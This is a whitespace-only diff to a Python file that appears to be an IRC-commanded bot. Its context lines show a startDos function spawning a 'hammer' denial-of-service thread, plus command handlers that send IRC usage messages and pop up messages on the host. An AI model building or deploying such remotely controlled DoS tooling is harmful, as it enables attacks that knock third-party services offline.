@@ -43,7 +43,7 @@ def login():
 
 def startDos(url):
 	''' Start dos module(hammer) in new thread '''
-	
+
 	thread = threading.Thread(target=hammer.run, args=(url, ))
 	thread.daemon = True
 	thread.start()
@@ -77,7 +77,7 @@ def run(msg, priv=False):
 			
 			else:
 				pass
-					
+
 		else:			
 			for i in hammer.usage:
 				send("PRIVMSG %s :%s"%(receiver, i))
@@ -88,7 +88,7 @@ def run(msg, priv=False):
 			content = ' '.join(message[1:])
 			popupMessage(content)
 		else:
-			send("PRIVMSG %s :%s"%(receiver, popup.usage))		
+			send("PRIVMSG %s :%s"%(receiver, popup.usage))
 
 	else:
 		pass
